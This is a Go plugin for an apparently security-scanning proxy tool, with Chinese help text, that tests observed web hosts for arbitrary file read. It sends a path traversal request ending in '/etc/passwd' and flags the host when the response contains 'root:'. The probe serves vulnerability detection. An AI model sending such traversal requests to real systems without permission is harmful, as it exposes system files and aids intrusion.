package plugins

import (
	"strconv"
	"goFoxy/manager"
	"net/http"
	"fmt"
	"io/ioutil"
	"strings"
	"goFoxy/common"
)

func init() {
	pl := arbitraryFilesRead{}
	pl.Name = "arbitraryFilesRead"
	pl.Author = "dk"
	pl.Default = true
	pl.Help = "WEB容器任意文件读取检测"
	manager.Regist(pl.Name, pl)
}

type arbitraryFilesRead struct {
	manager.Plugin
}

var httpClient2 = http.Client{}

func (this arbitraryFilesRead) GetPluginInfo() map[string]string {
	infoMap := make(map[string]string)
	infoMap["name"] = this.Name
	infoMap["author"] = this.Author
	infoMap["default"] = strconv.FormatBool(this.Default)
	infoMap["flag"] = strconv.FormatBool(this.Flag)
	infoMap["help"] = this.Help
	return infoMap
}

func (this arbitraryFilesRead) SetPluginFlag(flag bool) bool {
	this.Flag = flag
	return true
}

func (this arbitraryFilesRead) Toggle() {
	if this.Flag {
		this.Flag = false
	} else {
		this.Flag = true
	}
}

func readFile(flow common.Flow, url string) {
	linuxURL := url + "/../../../../../../../../../../../../etc/passwd"
	linuxResp, err := httpClient2.Get(linuxURL)
	if err == nil {
		if linuxResp.StatusCode == 200 {
			pContent, _ := ioutil.ReadAll(linuxResp.Body)
			linuxResp.Body.Close()
			if strings.Contains(string(pContent), "root:") {
				tmpInfo := common.Vuln{FlowID: flow.ID}
				tmpInfo.Host = flow.Host
				tmpInfo.Title = "任意文件读取"
				tmpInfo.Level = "中危"
				tmpInfo.Content = fmt.Sprintf("%s 可能存在 WEB容器任意文件读取漏洞", linuxURL)
				tmpInfo.LogVulnInfo()
			}
		}
	}
}

func (this arbitraryFilesRead) Process(flow common.Flow) {
	newURL := flow.GetSafeBaseURL()
	go readFile(flow, newURL)
}
